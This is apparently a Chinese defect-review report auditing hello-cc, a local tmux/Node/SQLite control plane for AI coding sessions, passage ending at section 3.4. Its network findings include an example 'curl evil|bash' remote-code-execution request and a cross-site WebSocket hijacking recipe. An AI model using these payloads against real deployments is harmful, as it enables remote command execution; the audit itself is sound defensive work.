# hello-cc 缺陷评审终审报告

> 评审对象:hello-cc —— 本机控制平面,通过 tmux + 常驻 Node Web 运行时 + `node:sqlite`(WAL)`mesh.db` 协调 Claude Code / Codex CLI 会话
> 源码:`/Users/xf02163/Desktop/project/wjj/hello-cc`
> 日期:2026-07-25 | 结论基准:已核实发现(CONFIRMED/PLAUSIBLE),已剔除被驳回项

---

## 1. 执行摘要

hello-cc 的**协调内核是扎实的**:任务认领、`claimNext`、takeover、锁的获取/续期/释放等真正的读改写(read-modify-write)都正确地包在 `tx()` = `BEGIN IMMEDIATE` + 忙重试里,`busy_timeout=5000` 也已设置,`claimNext` 还额外加了 `WHERE owner IS NULL` 守卫。因此提示中最担心的"双认领 / 双获锁"竞态是**真正被 RESERVED 写锁挡住的**。问题不在核心事务层,而在**它周围的运行时模型、发现层、存活语义和网络暴露面**。

本次评审共确认 **34 项缺陷**(32 CONFIRMED + 2 PLAUSIBLE),其中 **15 项为 high**。它们收敛到 5 个结构性弱点:

1. **单一共享后台运行时没有任何顶层异常兜底。** 全 `bin/hcc.mjs` 只注册了 `SIGINT`/`SIGTERM`,**没有 `uncaughtException`/`unhandledRejection` 处理器**。而多个 `setInterval` 轮询器与 WS upgrade 处理器都在 try/catch 之外调用会同步抛错的 `connect()`。结果:一次瞬时 DB 锁、一次 ENOSPC/EACCES、一个损坏的兄弟项目 DB、一个畸形 upgrade 请求,都会让**服务所有项目的整个共享运行时进程退出**(bg-02、bg-03、rob-01、rob-03、rob-06)。这是全报告复现频率最高的根因。

2. **Web 控制台默认把一个"裸 shell"暴露给整个局域网,唯一凭证还在 URL 与日志里明文流转。** 默认绑定 `0.0.0.0:8787`、无 TLS,终端输入/会话生成路由把"持有一个 token"变成"从网络对运行 hcc 的用户 RCE"。token 走 URL query、被 `console.log` 打进 world-readable 的 `web.log`、非常量时间比较、全机全局永不轮换、且可经未校验的 `?project=/db=` 访问任意项目 DB(net-01…07)。默认配置下应视为**可被局域网远程利用**。

3. **存活检测完全被动,且自相矛盾。** peer 是否 active 只看 `now()-last_seen_at <= 600`,从不看 `status`;但两条死亡路径在标记 peer `exited/detached` 的同一瞬间把 `last_seen_at` 写成 `now()`,于是**刚刚死掉的 owner 反而 `owner_active=true`**、其任务在约 600s 内无法按 stale 策略接管(hb-01)。同时活着但安静的 Web/tmux peer 因终端 I/O 从不刷新 `last_seen_at` 而超时老化、被判 `takeover_ready`、并被永久排除出自动重连(hb-04)。没有任何 reaper,崩溃的 hook-only peer 会"活着"最多 600s、以僵尸行残留 7–14 天(hb-02)。

4. **`connect()` 的副作用过重,把无关项目耦合成硬失败。** 每一次 `connect()`——包括 `hcc status`/`peers`/`task list` 这类纯读——都无条件跑一个 `BEGIN IMMEDIATE` 写事务(重记迁移、重写 `meta`/`user_version`),使所有连接串行化并在每次打开时追加 WAL 帧(conc-01);同一个 `connect()` 还会打开并写迁移**每一个已注册项目的 DB**,任何一个繁忙/损坏的兄弟 DB 都会把无关项目的命令直接打成 `REGISTERED_DB_MIGRATION_FAILED`(conc-02、rob-03)。因为 `node:sqlite` 同步 + 忙路径用 `Atomics.wait`,这套"连接即写"能把单线程 Web 运行时的事件循环冻结数秒(conc-03)。

5. **恢复路径乐观且无校验——尽管 GC 路径里已有现成的校验。** 启动恢复 `restoreTmuxManagedSessions` 按存储的 `%N` 直接重新收养面板,不校验该面板是否仍属于期望的 hcc 托管会话或 HCC_ROOT,而 tmux 服务器重启后 `%N` 会重排,于是浏览器终端可能被**串接到一个无关的本地面板**(内容泄露 + 击键注入,sess-01)。发现层的 `runtime.json` 非原子写入,读者却在任何解析失败时删除该文件,一次撕裂读就能孤立一个健康的运行时(rob-02、bg-07、rob-05)。

**总体健康度:** 核心并发正确,但**可用性、安全性、存活正确性**三条线都存在 high 级结构缺陷,任意一条在真实多项目/局域网/长时间运行场景下都会造成用户可感知的严重故障。建议在任何超出 loopback 的暴露之前,先完成第 5 节 P0 项。

---

## 2. 严重问题排行(Top Risks)

下表按后果严重度排序,合并了跨维度的重复项(同一根因在不同领域各记一次的,归并到一行并标注全部 id)。除特别标注外均为 **CONFIRMED**。

| 等级 | 领域 | 问题 | 位置 file:line | 后果 |
|---|---|---|---|---|
| **P0 严重** | 远程安全 | 默认 `0.0.0.0` 绑定 + 终端输入/会话生成路由 = 单 token 背后的局域网 RCE,无沙箱、无 TLS | `bin/hcc.mjs:4163`;`lib/web/runtime.mjs:132` | 同网段持 token 者 `POST /api/sessions` 或 WS `input` 帧即以 hcc 用户身份任意执行代码(net-01) |
| **P0 严重** | 远程安全 | WS upgrade 不校验 Origin/Host;`authOk` 在空 token 时 fail-open,`--no-token` 把终端暴露给任意来源/主机 | `bin/hcc.mjs:4316`;`lib/web/http.mjs:57` | 跨站 WebSocket 劫持(CSWSH)→ 受害者浏览任意网页即被 drive-by RCE;`--no-token` + `0.0.0.0` = 零认证 shell(net-04) |
| **P0 严重** | 远程安全 | token 全机全局、永不轮换,经未校验 `?project=/db=` 可读写任意项目 DB | `bin/hcc.mjs:2315`;`lib/web/runtime.mjs:117` | 一次泄露即永久全机凭证;`GET /api/state?project=/其他项目` 读取并可变更他项目 peers/tasks/messages(net-03) |
| **P0 严重** | 远程安全 | 唯一 token 明文传输/存储:URL query、world-readable `web.log`、无 TLS、无 Referrer-Policy | `lib/web/runtime.mjs:75`;`bin/hcc.mjs:2157,4448` | 同机他用户读 `web.log` 提权;局域网嗅探/ARP 欺骗抓取 token + 整条 shell 流(net-02) |
| **P0 严重** | 会话回收 | `restoreTmuxManagedSessions` 按陈旧/外来 `%N` 重新收养面板,无会话名/HCC_ROOT 校验 | `bin/hcc.mjs:3747` | tmux 重启后浏览器终端被串接到用户编辑器等无关面板:内容泄露 + 击键注入 + 强制缩放(sess-01) |
| **P0 严重** | 后台/健壮性 | WS upgrade 处理器无 try/catch 且在其外调用 `connect()`;无 `uncaughtException` 处理器 | `bin/hcc.mjs:4331,4316` | 一个损坏 DB 的良性请求或一个畸形 upgrade 即令整个共享运行时崩溃(网络可达 DoS)(bg-03) |
| **P0 严重** | 后台/健壮性 | auto-attach 轮询器在 try/catch 外调用 `connect()`;无 `uncaughtException` 处理器 | `bin/hcc.mjs:2566,2648`;`rob-01` 同根因 | 一个损坏的已注册项目 DB 每 5s 触发 `REGISTERED_DB_MIGRATION_FAILED` → 未捕获异常 → 整个运行时退出,杀掉所有项目的实时终端(bg-02/rob-01) |
| **P0 严重** | 并发/健壮性 | 一个损坏的兄弟项目 DB 使每一次 `connect()` 永久抛错(跨项目爆炸半径) | `bin/hcc.mjs:431,405` | 项目 B 的 `mesh.db` 损坏后,A、C 中每条 hcc 命令都在 `connect()` 处抛 `REGISTERED_DB_MIGRATION_FAILED`,叠加无兜底导致运行时崩溃循环(conc-02/rob-03) |
| **P0 严重** | 后台/健壮性 | `writeRuntime` 非原子 + 读者遇解析失败即删文件,撕裂/写满即孤立健康运行时 | `lib/runtime/state.mjs:36,57,20` | ENOSPC 或写入途中被杀 → `runtime.json` 截断 → 下一个读者 `JSON.parse` 抛错 → `rmSync` 删除指针 → 运行时活着却不可发现,所有 shim 脱网(rob-02) |
| **P0 严重** | 并发 | 每次 `connect()`(含只读命令)都跑 `BEGIN IMMEDIATE` 写事务,串行化所有会话并每次追加 WAL | `lib/db/schema.mjs:307`;`bin/hcc.mjs:398` | 并发只读命令互相排队甚至 `SQLITE_BUSY`;纯读项目的 `mesh.db-wal` 也持续膨胀(conc-01) |
| **P0 严重** | 并发 | 同步 DB + `Atomics.wait` 忙重试冻结单线程 Web 运行时事件循环达数秒 | `lib/db/schema.mjs:13,24`;`bin/hcc.mjs:401` | 写竞争峰值时所有浏览器实时终端同时卡死,ws 心跳/HTTP 动作全部停摆(conc-03) |
| **P0 严重** | 心跳 | 标记 peer `exited/detached` 时把 `last_seen_at=now()`,死 owner 读成 `owner_active=true`,stale 接管被拒约 600s | `lib/core/peers/liveness.mjs:33`;`bin/hcc.mjs:2828,4270` | 面板已死,恢复 peer `takeover --policy stale` 被 `TAKEOVER_POLICY` 拒绝,任务被"尸体"占用达 600s(hb-01) |
| **P0 严重** | 心跳 | 实时终端 I/O 从不刷新 `last_seen_at`,活跃但安静的 peer 老化 → `takeover_ready` → 被永久排除出自动重连 | `bin/hcc.mjs:2451,4349,2576` | codex peer 或停在交互提示的 peer >10min 无 hook 调用即被他人合法夺走任务;运行时重启后再不被重新收养(hb-04) |
| **P1 高** | 心跳/并发 | 默认 takeover 策略为 `any`,绕过整个 `owner_stale/takeover_ready` 计算,可夺走活 owner 的任务 | `bin/hcc.mjs:1075`;`lib/core/coordination/tasks.mjs:76`;`lib/web/peer-actions.mjs:152` | B 无 `--policy` 直接夺走活 owner A 的 task#5,A、B 同时认为自己拥有,A 反被 `TASK_OWNED` 锁死(hb-07/conc-04) |
| **P1 高(PLAUSIBLE)** | 健壮性 | `fs.watch(bufsDir)` 无 `'error'` 监听器;异步 watcher 错误在无兜底下崩溃运行时 | `bin/hcc.mjs:2499` | Linux inotify 触顶或 `.hello-cc/bufs` 被删 → FSWatcher 发 `'error'` 无监听 → Node 抛出 → 整个运行时退出;watcher fd 还在 shutdown 泄漏(rob-06) |

> **PLAUSIBLE 标注:** rob-06(见上,PLAUSIBLE/medium)与 bg-07(`lib/runtime/state.mjs:19`,PLAUSIBLE/low,已并入 rob-02 的原子写修复)为推定成立、复现依赖具体 FS/时序条件。其余 Top Risks 均为 CONFIRMED。

---

## 3. 分领域深度分析

### 3.1 后台状态管理(bg)

**子系统:** 全机只跑**一个**共享后台 Web 运行时(由 `~/.hello-cc/runtime.json` 追踪),意图服务多个项目,但生命周期管线只做了"半适配"。运行时长驻,持有 6 个 `setInterval` 轮询器 + 每会话定时器、一个 `fs.watch`、若干打开的 fd 和 tmux pipe 订阅,并以非原子方式改写共享 JSON 状态文件。最严重的是恢复/可用性问题。

| id | 等级 | 位置 | 机理 → 失败场景 |
|---|---|---|---|
| **bg-02** | high | `bin/hcc.mjs:2566` | `scanAndAttachDetectedPeers` 在 `try{`(2567)**之前**调用 `const db = connect(ctx)`,由 `setInterval(...,5000)` 驱动。`connect()` 每次跑 `initSchema` + `migrateRegisteredProjectDbs`,后者对坏 DB 显式 `throw CliError('REGISTERED_DB_MIGRATION_FAILED')`(431-435)。无 `uncaughtException` 处理器 → 同步 interval 回调抛错即进程终止。**场景:** 已注册的 projectX 的 `mesh.db` 损坏,下一个 5s tick → 整个共享运行时退出,杀掉所有项目的实时终端。 |
| **bg-03** | high | `bin/hcc.mjs:4331` | `server.on('upgrade', ...)`(4316)是同步监听器,在 try/finally(4333)外调用 `projectFromRequest`(解析攻击者可控的 `?root/?project/?db`)与 `connect(reqCtx)`。默认绑 `0.0.0.0`。**场景:** 良性——为某损坏 DB 的项目开终端即崩溃;对抗性——持 token 的 LAN 客户端发 `?db=/proc/x` 或不可写 `?root=` 使 `mkdirSync/new DatabaseSync` 抛错 → 按需 DoS。 |
| **bg-01** | medium | `lib/runtime/state.mjs:50` | `readRuntime()` 只要本地 `runtime.json` 有 `base_url` 就返回,**从不校验 `pid` 存活、从不探测**。`shutdown()` 只 `clearRuntime` 自己的 primary ctx;崩溃路径什么都不删。**场景:** 项目 B 复用 A 的运行时;运行时死亡后,B 的每条命令读到陈旧文件 → `RUNTIME_UNREACHABLE` 永久失败,直到手动 `rm` 或在 B 内 `hcc down/web`。 |
| **bg-04** | medium | `bin/hcc.mjs:2402` | 持续轮询器硬编码到 primary ctx:`bufsDir` 固定为主项目、`adoptExternalSession` 强制 `pctx = ctx`、auto-attach 用 `connect(ctx)`。**场景:** 在 B 启动的 shim/tmux peer 永不出现在 Web UI,浏览器必须为每个 B peer 手动 `POST /api/sessions/attach`。 |
| **bg-05** | low | `bin/hcc.mjs:2157` | `web.log` 以 append 打开作为 detached child 的 stdout/stderr,**无轮换/无上限**;每次重启追加 banner,崩溃-重启循环的堆栈无限累积。**场景:** 长跑或崩溃循环把 `web.log` 撑到写满磁盘;`tailFile` 只读尾部,运维直到卷满才发觉。 |
| **bg-06** | low | `bin/hcc.mjs:3970` | 几乎每个请求都经 `rememberProject→registerProject` 对 `projects.json` 无锁读改写:`readProjectRegistry` 对**每个**项目根 `statSync`,`writeFileSync` 非原子。**场景:** 几个浏览器标签每秒轮询,N 个已注册项目即每请求 N 次 statSync + 全量重写;两个并发请求交错互相覆盖,读者撞到半写文件得到解析错误(被吞 → registry 瞬时为空)。 |
| **bg-07** | low(PLAUSIBLE) | `lib/runtime/state.mjs:19` | `writeGlobalRuntime/writeRuntime` 用裸 `writeFileSync`,读者遇 `JSON.parse` 失败即 `rmSync` 删文件;父进程每 150ms 轮询、15s 超时后 `process.kill(-child.pid,'SIGTERM')`。**场景:** 慢 FS 上父进程撕裂读到子进程刚写的 global 文件 → 删除 → 父进程 15s 超时杀掉健康运行时,报 `RUNTIME_START_TIMEOUT`。(并入 rob-02 修复) |

**推荐修复(引用开源做法):**

- **顶层兜底 + 轮询器加固(bg-02/bg-03):** 采纳 **systemd/supervisord 的"守护者不能死在它要诊断的进程之前"**理念(CCB `ask-runtime-health-mechanism.md` 明确点名此反模式)。立即:注册 `process.on('uncaughtException')`/`process.on('unhandledRejection')`,记入 `web.log` 并保活;把 `connect()` 移入 try、`autoAttachScanInFlight` 在 finally 复位;upgrade 监听器整体包 try/catch,出错时 `socket.destroy()` 而非抛出。
- **启动 + 周期对账(bg-01):** 抄 **vibe-kanban 的启动 reconciliation**——boot 时"Marked orphaned execution process as failed",逐行核对 tmux 会话/pid 是否存活。`readRuntime` 返回前先校验 `pid` 存活(`isProcessAlive`)或做一次廉价探测,失败即删文件下沉到 `RUNTIME_NOT_RUNNING`;`clearRuntime/shutdown` 遍历项目注册表删除所有 `pid==停止 pid` 的 `runtime.json`。
- **多项目订阅(bg-04):** 按已注册项目(遍历 `projectContexts/knownProjects`)分别建 `bufsDir` watch 并运行 auto-attach;或借 **tmux `-CC` 控制模式**每会话一个事件流替代 primary-ctx 单循环。
- **发现指针原子化(bg-07):** 用仓库里**已存在的** `writeJsonSafe`(`lib/shared/json-file.mjs`,temp+rename)替换裸写;解析失败先重试再隔离,不立即删。
- **注册表写入治理(bg-06):** 只读请求不落盘;抄 **hcom 单连接 + 短事务**思路,注册去抖(每项目每分钟至多一次)、statSync 结果缓存、temp+rename 原子写。
- **日志轮换(bg-05):** 开日志前超阈值即 `web.log→web.log.1` 轮转保留 N 份。

---

### 3.2 心跳与存活检测(hb)

**子系统:** 存活完全**被动派生**:peer active ⇔ `now()-last_seen_at <= ACTIVE_PEER_TTL(600)`。**没有真正的心跳**——`last_seen_at` 只由 provider hook(`cmdHook`)、显式 `hcc heartbeat`、CLI 命令里顺带的 `touchCurrentPeer` 写入。没有任何轮询器/reaper 按年龄把 peer 标 `stale/exited`,唯一按年龄清理的是 7–14 天后的 `gc`。

| id | 等级 | 位置 | 机理 → 失败场景 |
|---|---|---|---|
| **hb-01** | high | `lib/core/peers/liveness.mjs:33` | `taskOwnerLiveness`/`takeoverPolicyDetails` 只按 `ownerAge=t-last_seen_at` 算 active,从不读 `status`;但 `detachTmuxSession`(2828)与 `/api/detected/stop`(4270)在死亡瞬间 `SET status=..., last_seen_at=now()`。**场景:** 面板死后 `owner_age≈0` → `owner_active=true`、`ownerStale=false`,恢复 peer 的 `takeover --policy stale` 被 `TAKEOVER_POLICY` 拒绝,任务被尸体占用 600s。 |
| **hb-04** | high | `bin/hcc.mjs:2451` | `outputPoller`(100ms)与 WS `input` 处理器(4349-4351)都不写 `last_seen_at`;auto-attach 过滤 `last_seen_at >= now-600`(2576-2580)。**场景:** codex peer 或停在交互提示者 >10min 无 hook → `owner_stale` → 任务被他人合法夺走;运行时重启后该 pane 过不了 `last_seen_at` 过滤,永不自动重连。 |
| **hb-02** | medium | `bin/hcc.mjs:5538` | 无 reaper。唯一按年龄清理是 `gc`(cutoff = now − 7/14 天)。Claude `Stop` hook 只在优雅空闲触发,不在 SIGKILL/崩溃触发。**场景:** `claude` peer 被 `kill -9`,`status` 卡在 `working`、`last_seen_at` 冻结;600s 内显示 active,之后 stale 但 status 永不变 `exited`,僵尸行残留至多 14 天。 |
| **hb-03** | medium | `bin/hcc.mjs:2471` | 外部会话 `exitPoller` 只改内存、`sessions.delete`,**不写 peers 表**(对比 `detachTmuxSession`/`/api/detected/stop` 都写)。**场景:** shim 会话 `.out` 消失后,peers 行仍保留旧 status,`hcc peers` 显示已结束 peer 为 active,叠加 hb-01。 |
| **hb-06** | medium | `bin/hcc.mjs:4777` | `cmdHook` 每次刷新 `last_seen_at` 但**不续锁**;锁仅由显式 `heartbeat --renew-locks` / `lock renew` 续。stale(600)<lockTTL(900) 的设计被破坏。**场景:** A 持写锁持续工作、hook 使其永不 stale,t=900s 锁静默过期,B `hcc lock` 成功,两活 peer 同持一逻辑锁。 |
| **hb-07** | medium | `bin/hcc.mjs:1075` | `policy = opts.policy || 'any'`;`takeoverPolicyDetails` 在 `any` 时无视存活返回 `ok=true`,`takeover_ready` 门只是展示注解。**场景:** B 无 `--policy` 夺走 active owner A 的 task#5,A/B 同时认为拥有。(= conc-04) |
| **hb-05** | medium | `bin/hcc.mjs:354` | 全用墙钟秒 `Math.floor(Date.now()/1000)`,无单调时钟/跳变检测;锁 `expires_at` 亦墙钟。**场景:** 笔记本睡眠 30min,唤醒后所有 peer 年龄瞬间 >600、所有锁读作过期 → 自动化把一批完全存活的 owner 的任务重分配;NTP 回拨则让真死 peer 读回 active。 |
| **hb-08** | low | `bin/hcc.mjs:505` | `upsertPeer` 的 `ON CONFLICT` 无条件 `status=excluded.status`(不同于 `touchPeer` 的 `COALESCE`)。**场景:** `exited` 的 X 被一次默认 `status='idle'` 的 auto-join/upsert 复活成活样并 `last_seen_at=now()`,重新符合 auto-attach;`blocked` 亦可被无关 upsert 重置。 |

**推荐修复(引用开源做法):**

- **死亡从 tmux 事实判定,而非 TTL(hb-01/hb-02/hb-03/hb-04):** 抄 **CCB "detect death from tmux facts"** 与 **tmux `remain-on-exit` + `pane-died` hook + `#{pane_dead_status}`**。把存活拆成两态:(1)**HARD-DEAD**——tmux 面板进程被 reap / `pane_dead=1` 时,立即置 `status='exited'`(与年龄无关),让 `owner_stale` 瞬时为真;(2)**SOFT-STALE**——保留现有 TTL,仅表示"活着但没心跳"。让 `taskOwnerLiveness`/`takeoverPolicyDetails` 把 `status in ('exited','detached')` 视为立即非活;死亡转移时**不要**把 `last_seen_at` 前推到 `now()`。boot + interval reaper 参照 **vibe-kanban** 的 orphaned-process 对账。
- **事件驱动心跳(hb-02/hb-04):** 抄 **tmux-agent-indicator/status 的 hooks 驱动**(`UserPromptSubmit`/`PermissionRequest`/`Stop`)——扩展 hello-cc 已安装的 provider hooks,在这些事件即时写 `last_seen_at`+state;并抄 **claude-squad/uzi 的 pane 内容哈希**作为无 hook 时的观察式存活(`outputPoller` 已读 pane 输出,加哈希对比即可区分"在产出" vs "wedged")。同时让运行时对真实 I/O(输出字节/输入帧)节流刷新 `last_seen_at`(每 30–60s 一次)。
- **续期比 = TTL/2(hb-06):** 抄 **systemd 半间隔看门狗**与租约文献的 1/2–1/3 续期比:把 peer 续期定为 300s、锁续期 450s,由真实定时器驱动;把锁续期并入 hook/heartbeat 路径,或让锁寿命跟随 peer 存活而非独立墙钟。
- **默认策略安全化(hb-07):** 默认改为 `blocked-or-stale`,夺取活 owner 需显式 `--force/--policy any`;让 `takeOverTaskForPeer` 复用 `takeover_ready`/存活信号,而非只看策略串。
- **单调时钟 + fencing(hb-05):** 抄 **Kleppmann fencing tokens + 单调时钟**——年龄/TTL 用 `process.hrtime.bigint()` 增量或持久化的每运行时单调基线;检测到大墙钟跳变后设 grace 窗抑制 stale/takeover 决策;加单调 `lock_epoch`/`takeover_seq` 列,把当前 epoch 盖进每次 owner 域写入,拒绝低于行内最新 epoch 的写——即便旧 owner 从未察觉被判死,接管也安全。
- **status 保留(hb-08):** `upsertPeer` 用 `COALESCE` 保留既有 status,除显式 restart 路径外拒绝把 peer 从 `exited` 迁出。

---

### 3.3 远程访问与安全(net)

**子系统:** Web 控制台是"用一个 bearer token 保护的、对 shell 的完整远程控制面",默认配置充满敌意:绑 `0.0.0.0:8787`、无 TLS,终端输入/会话生成路由把持有该 token 变成"从网络无认证 RCE"。token 本身守护薄弱——走 URL query、被回显进 world-readable `web.log`、非常量时间比较、全机全局永不轮换、经未校验 `?project=/db=` 可达任意 DB。**默认配置下应视为可远程利用。**

| id | 等级 | 位置 | 机理 → 失败场景 |
|---|---|---|---|
| **net-01** | high | `bin/hcc.mjs:4163` | `expectedWebHost()` 默认 `'0.0.0.0'`;`POST /api/sessions/:id/input` 与 WS `input` 帧都 `writeSessionInput→pty.write/tmuxSendLiteral`(任意字节入活 shell);`POST /api/sessions` 认 `input.command`(生成任意进程)。全部只由 `authOk`(URL token)把关,纯 HTTP 无 TLS。**场景:** 同网段持 token 者 `POST /api/sessions {"command":"curl evil|bash"}` 或 WS `input` → 以 hcc 用户 RCE。 |
| **net-04** | high | `bin/hcc.mjs:4316` | upgrade 只调 `authOk`,不看 `origin`/`Host`;`authOk` 在 `!token` 时 `return true`;`--no-token` 使 token=''。**场景:** `hcc web --no-token` on `0.0.0.0` → 任意网页 `new WebSocket('ws://受害:8787/ws/terminal/...')` 发 input 帧 → drive-by RCE;或任意 LAN 主机零凭证得 shell;token 模式下缺 Host 检查也无法防 DNS-rebinding。 |
| **net-03** | high | `bin/hcc.mjs:2315` | `makeWebToken()` 把一个 token 持久化到 `~/.hello-cc/web-token` 永久复用;`projectFromRequest` 取攻击者可控 `project/root/db` 直传 `contextForProject→connect()`,`path.resolve` 无 allowlist。**场景:** 为 A 铸的 token `GET /api/state?project=/其他项目` 读取并可变更他项目状态;永不轮换,一次泄露即永久全机凭证。 |
| **net-02** | high | `lib/web/runtime.mjs:75` | token 进 WS URL(ui-template.mjs:1615)与每个 fetch URL;`publicRuntimeUrl()` 被 `console.log`(4448),child stdout 重定向进 `web.log`(默认 0644);`sendHttp` 无 Referrer-Policy/CSP,无 https。**场景:** 同机他用户读 `web.log` 提权;LAN 被动嗅探抓 token+shell 流;token 留浏览器历史并经 Referer 泄露。 |
| **net-07** | medium | `bin/hcc.mjs:3978` | `connect()` `mkdirSync(dirname(dbPath),{recursive})` 后开新 SQLite;`dbPath` 来自未校验的 `db=`/`x-hcc-db` 与 `POST /api/projects` 的 `input.db`。**场景:** `POST /api/projects {"root":"/","db":"/受害/任意/x.db"}` 在任意可写路径创建目录树与 DB 文件——完整性/DoS 写原语,叠加 net-03 跨项目读。 |
| **net-05** | medium | `bin/hcc.mjs:2778` | 每会话 action token 只在 `resolveWebActionSession` 的 peer **变更**动作里校验,**不覆盖** `/input` 与 WS `input`(真正的 RCE 路径);且 `serializeSession` 把 `action_token` 返给任何 `GET /api/sessions` 的调用者。**场景:** 持 URL token 者无需 action token 即可经 `/input` RCE;要用到的地方也可先 `GET /api/sessions` 读出——该"加固"在 LAN 威胁模型下不挡任何事。 |
| **net-06** | low | `lib/web/http.mjs:61` | `authOk` 用 `===`/`!==` 比较,非 `timingSafeEqual`。**场景:** 主要是加固缺口;192-bit 随机 token 使实际时序侧信道利用困难,风险低,但属标准廉价最佳实践。 |

**推荐修复(引用开源做法):**

- **默认 loopback,暴露需显式且吵闹(net-01/net-04):** 抄 **vibe-kanban(issue #237 把默认从 `0.0.0.0` 改为 `127.0.0.1`)/ code-server(默认 `127.0.0.1:8080`)/ wetty / ttyd(`-i 127.0.0.1`)**。默认绑 `127.0.0.1:8787`;`--host 0.0.0.0`/`--expose` 需显式并打印**醒目警告**;非 loopback 无 token 时**拒绝启动**(抄 Vibe-Trading PR #338 的 startup WARNING)。`--no-token` 强制 loopback-only。文档给出 `ssh -L 8787:127.0.0.1:8787` / Tailscale / cloudflared 作为远程推荐路径(CCB `mobile-cloudflare-alpha.md` 的 loopback 网关 + 命名隧道)。
- **凭证移出 URL/日志,改 cookie + TLS(net-02):** 抄 **code-server 的登录 + 会话 cookie**——小 `/login` 接受一次 token,置 `HttpOnly + SameSite=Strict + Secure` cookie,HTTP 路由与 WS upgrade 都基于该 cookie 把关;URL 只印无 token 版;`web.log` 建为 0600;加 `Referrer-Policy: no-referrer` + CSP;非 loopback 强制 TLS(ttyd `-S/-C/-K`,或文档化 Caddy/nginx 反代)。抄 **hcom** 的教训:token 绝不进 env/日志,只显示指纹。
- **Origin/Host 校验(net-04):** 抄 **ttyd `-O/--check-origin`**——upgrade 前校验 `Origin`(缺省或在 loopback/已知主机 allowlist 内)与 `Host` 对应绑定地址,不符返回 403;配合 cookie 的 `SameSite=Strict`。
- **每运行时/每项目 token + 路径 allowlist(net-03/net-07):** 每次 `hcc web` 铸新 token 并把授权 scope 限在本运行时项目;`project/root/db` 必须在已注册项目的 `.hello-cc` 目录内,规范化后前缀 allowlist 校验,拒绝越界;绝不从请求提供的绝对路径创建新 DB。给 token 加**过期 + 轮换/吊销**(抄 hcom "#1 regret is no expiry/revocation";在 `mesh.db` 存 token 哈希 + `expires_at`,吊销即删行,并级联关闭活 ws 终端——CCB 的 revocation cascade)。
- **action token 真正独立 + 覆盖 RCE 路径(net-05):** 不把 `action_token` 序列化给所有客户端;只经会话自身认证信道下发;在 `/input`/生成/WS 路径要求真正的每会话密钥。抄 **CCB 的 per-device scoped tokens(view/focus/terminal_input)+ 输入帧单调序号**防重放,重连带 resume cursor(hello-cc 已有 `streamPoller/lastBroadcastTime` 可扩展)。
- **常量时间比较(net-06):** URL token 与 action token 都用 `crypto.timingSafeEqual`(定长 buffer)。
- **威胁模型定位:** 采纳 **NCC Group ttyd advisory** 的教训——把 ws 输入路径当作安全关键边界审计;凭证层永远不能是唯一防线(补齐"谁能到达"这一层)。

---

### 3.4 会话与中断状态回收(sess)

**子系统:** 恢复完全依赖 tmux 面板 id(`%N`)与文件存在性作为身份/存活信号,在收养/恢复路径上**没有防御性再校验——尽管完全相同的校验已存在于 GC 路径**。启动恢复按存储 `%N` 重新收养,零校验面板是否仍属期望的 hcc 托管会话/根;tmux 服务器重启即可把浏览器终端(输入+输出+缩放)串接到外来本地面板。

| id | 等级 | 位置 | 机理 → 失败场景 |
|---|---|---|---|
| **sess-01** | high | `bin/hcc.mjs:3747` | `restoreTmuxManagedSessions` `SELECT ... WHERE transport='tmux' AND runtime_target IS NOT NULL`(无 status/last_seen 过滤),逐行 `attachTmuxSession({pane: row.runtime_target, force:true})`;`attachTmuxSession` 只检 `info.dead`,**不校验** pane 的 tmux 会话名 `== tmuxManagedSessionName(pctx,row.id)`、也不校验 HCC_ROOT——而 GC 路径的 `planTmuxGc`/`validateTmuxGcCandidate` 两处都做了这些校验(5271-5302,5402-5409)。`%N` 跨 tmux 重启会重排。**场景:** tmux 独立重启后用户开自己的编辑器占了 `%0`,重启 `hcc web` → 恢复把 `claude-<x>`(runtime_target=%0)接到编辑器面板,串流其内容、标 running,浏览器连上后把击键 `tmuxSendLiteral` 注入编辑器并 `resize-window` 缩小它。 |
| **sess-02** | medium | `bin/hcc.mjs:4367` | `shutdown()` 只 `clearRuntime(ctx)`(仅删 runtime.json)+ 清轮询器 + 逐会话 `stopTmuxStream`,**无任何 DB 写**(从不调 `detachTmuxSession`,而后者是唯一置 `peers.status` 并 null `runtime_target` 的地方)。**场景:** 优雅 Ctrl-C 后所有托管 peer 仍 `status='running'` + 悬垂 `%N`;下次 `hcc web` 恢复正好消费这些陈旧 `runtime_target`——这就是 sess-01 串接的燃料。 |
| **sess-03** | medium | `bin/hcc.mjs:3390` | 每会话 `exitPoller`(3s):`tmuxPaneInfo` 对**任何** `display-message` 失败即抛错(非仅面板真死),3 次连续失败即 `detachTmuxSession(...,'exited')`,置 `status='exited'` 且 `runtime_target=NULL`。之后既过不了恢复(需 runtime_target)也过不了 auto-attach(需 status running/working/busy)。**场景:** tmux 服务器短暂无响应约 9s,3 次 `display-message` 失败 → 活着的 provider 被判 exited、绑定被清,永久失联需手动重连;整机 tmux blip 一次清掉所有托管 peer 的 runtime_target。 |
| **sess-04** | medium | `lib/core/peers/session.mjs:4` | `providerSessionPeerId` 把 provider id `slice(0,8)` 后再 hash/sanitize,作为 peer id 与 tmux 会话名;shim 侧同样 `${RESUME_ID:0:8}`。**场景:** resume `feature-login` 与 `feature-logout`(或共享 8-hex 前缀的两个 UUID)→ 同 peer id `codex-feature` → 同 tmux 会话名;启动第二个见 `hasSession=true` 静默接到**第一个**会话的终端,操作者以为在驱动 B 实则在驱动 A。 |
| **sess-06** | low | `bin/hcc.mjs:3608` | `restartExistingTmuxSession` 把活会话改名为 parked 后、在替代存在**之前**销毁内存会话(`status='detached'`;`sessions.delete`);仅当 `new-session`+`attach` 成功才重建。失败的 catch 只 `restoreParkedOldTmuxSessions()` 改回名,**不重建内存会话/pipe-pane/exitPoller**。**场景:** relaunch 时 `new-session` 抛错 → 旧面板改回名仍活在 tmux,但运行时无会话跟踪它:无串流、无退出检测,浏览器输入被静默丢弃(WS 需 `status==='running'`),直到某次 auto-attach/restore 恰好再收养。 |
| **sess-05** | low | `bin/hcc.mjs:2471` | 外部 buffer 收养用单持久 fd + `if(!fs.existsSync(outFile))` 判死(无进程存活检查,尽管 meta 带 pid);`scanExternalSessions` 收养启动时**任意** `*.out`;而唯一写者 `cmdRunWebManaged`(4524)**无任何调用者**(`web-managed` opt 解析后从不分支),且只注册 SIGINT/SIGTERM 清理(非 SIGHUP)。**场景:** 遗留 `.hello-cc/bufs/<peer>.out`(旧版本/被 SIGHUP 的生产者)在 `hcc web` 启动时被收养成永不退出的 `running` 幽灵终端,直到 7–14 天后 `hcc gc`;inode 复用还会让单 fd 卡在旧 unlinked inode。 |

**推荐修复(引用开源做法):**

